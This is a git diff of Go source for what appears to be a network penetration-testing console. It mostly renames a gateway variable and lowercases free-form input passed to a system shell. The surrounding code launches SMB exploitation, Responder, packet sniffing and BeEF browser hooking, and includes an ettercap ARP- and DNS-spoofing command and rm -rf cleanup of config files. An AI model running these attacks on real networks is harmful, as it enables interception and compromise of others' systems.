@@ -52,7 +52,7 @@ func NetworksPentest() {
         case "run", "start", "launch", "exploit", "execute":
             executeFunction()
         default:
-            utils.SystemShell(Input)
+            utils.SystemShell(strings.ToLower(Input))
         }
     }
 }
@@ -83,9 +83,9 @@ func executeCommand(cmd string) bool {
         {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
         {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},
 
-        {[]string{"info"}, menus.HelpInfoNetworks},
+        {[]string{"info"}, func() {menus.HelpInfoNetworks(Function)}},
         {[]string{"m", "menu"}, menus.MenuThree},
-        {[]string{"option", "options", "show option", "show options"}, func() {menus.NetworksOptions(utils.NeMode, utils.IFace, utils.RHost, utils.BeefPass, utils.LHost, utils.Gateway, utils.Spoofer, utils.Proxies, utils.FakeDns, Function)}},
+        {[]string{"option", "options", "show option", "show options"}, func() {menus.NetworksOptions(utils.NeMode, utils.IFace, utils.RHost, utils.BeefPass, utils.LHost, utils.GateWay, utils.Spoofer, utils.Proxies, utils.FakeDns, Function)}},
 
         {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListInternalFunctions},
 
@@ -161,7 +161,7 @@ func handleSetCommand(parts []string) {
       "build": &utils.BuildName,
       "proxies": &utils.Proxies,
       "passwd": &utils.BeefPass,
-      "gateway": &utils.Gateway,
+      "gateway": &utils.GateWay,
       "fakedns": &utils.FakeDns,
       "spoofer": &utils.Spoofer,
       "toolsdir": &utils.ToolsDir,
@@ -277,7 +277,7 @@ func handleUnsetCommand(parts []string) {
       "build": &utils.BuildName,
       "proxies": &utils.Proxies,
       "passwd": &utils.BeefPass,
-      "gateway": &utils.Gateway,
+      "gateway": &utils.GateWay,
       "fakedns": &utils.FakeDns,
       "spoofer": &utils.Spoofer,
       "toolsdir": &utils.ToolsDir,
@@ -368,7 +368,7 @@ func executeFunction() {
         fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    NetworkPenFunctions(Function, utils.IFace, utils.Gateway, utils.LHost, utils.RHost, utils.NeMode, utils.FakeDns, utils.Spoofer)
+    NetworkPenFunctions(Function, utils.IFace, utils.GateWay, utils.LHost, utils.RHost, utils.NeMode, utils.FakeDns, utils.Spoofer)
 }
 
 func NetworkPenFunctions(Function string, args ...interface{}) {
@@ -429,7 +429,7 @@ func NetworkPenFunctions(Function string, args ...interface{}) {
         "smbexplo": func() {SmbVulnScan(utils.RHost); SmbExploit(utils.RHost, utils.LHost, utils.LPort)},
         "psniffer": func() {PacketSniffer(utils.NeMode, utils.RHost)},
         "responda": func() {KillerResponder(utils.IFace, utils.LHost)},
-        "beefkill": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)},
+        "beefkill": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.GateWay)},
         "toxssinx": func() {ToxssInx(utils.RHost)},
 
         "1": func() {DiscoverIps()},
@@ -439,7 +439,7 @@ func NetworkPenFunctions(Function string, args ...interface{}) {
         "5": func() {SmbVulnScan(utils.RHost); SmbExploit(utils.RHost, utils.LHost, utils.LPort)},
         "6": func() {PacketSniffer(utils.NeMode, utils.RHost)},
         "7": func() {KillerResponder(utils.IFace, utils.LHost)},
-        "8": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)},
+        "8": func() {BeefKill(utils.Spoofer, utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.GateWay)},
         "9": func() {ToxssInx(utils.RHost)},
     }
 
@@ -624,7 +624,7 @@ func KillerResponder(IFace, LHost string) {
     }
 }
 
-func BeefEttercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
+func BeefEttercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, GateWay string) {
     if err := utils.LocateTool("beef-xss", "ettercap"); err != nil {
         return
     }
@@ -704,7 +704,7 @@ func BeefEttercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway stri
             time.Sleep(405 * time.Millisecond)
 
             subprocess.Run(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null`, utils.LHost)
-            subprocess.Run(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, utils.IFace, utils.RHost, utils.Gateway)
+            subprocess.Run(`ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, utils.IFace, utils.RHost, utils.GateWay)
             subprocess.Run(`systemctl stop apache2.service beef-xss.service`)
             subprocess.Run(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.Files/* /var/www/html/; rm -rf /var/www/html/.Files/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dn`)
             subprocess.Run(`systemctl -l --no-pager status apache2.service beef-xss.service`)
@@ -795,7 +795,7 @@ func BeefEttercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway stri
     }
 }
 
-func BeefBettercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
+func BeefBettercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, GateWay string) {
     if err := utils.LocateTool("beef-xss", "bettrcap"); err != nil {
         return
     }
@@ -907,12 +907,12 @@ func BeefBettercap(NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway str
     }
 }
 
-func BeefKill(Spoofer, NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, Gateway string) {
+func BeefKill(Spoofer, NeMode, LHost, RHost, IFace, BeefPasswd, FakeDns, GateWay string) {
     switch strings.ToLower(utils.Spoofer) {
     case "ettercap":
-        BeefEttercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)
+        BeefEttercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.GateWay)
     case "bettercap":
-        BeefBettercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.Gateway)
+        BeefBettercap(utils.NeMode, utils.LHost, utils.RHost, utils.IFace, utils.BeefPass, utils.FakeDns, utils.GateWay)
     default:
         fmt.Printf("\n%s[!] %sInvalid required parameters SPOOFER: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, utils.Spoofer, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
